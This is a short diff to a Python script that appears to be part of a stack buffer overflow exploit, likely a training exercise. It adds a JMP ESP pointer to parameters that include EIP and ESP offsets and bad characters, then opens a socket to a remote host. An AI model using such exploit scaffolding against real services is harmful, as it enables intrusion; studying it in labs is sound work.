@@ -2,7 +2,7 @@
 import socket
 import struct
 
-from PARAMETERS import RHOST, RPORT, buf_totlen, offset_eip, offset_esp, badchar_sequence, sub_esp_10
+from PARAMETERS import RHOST, RPORT, buf_totlen, offset_eip, offset_esp, badchar_sequence, ptr_jmp_esp, sub_esp_10
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((RHOST, RPORT))
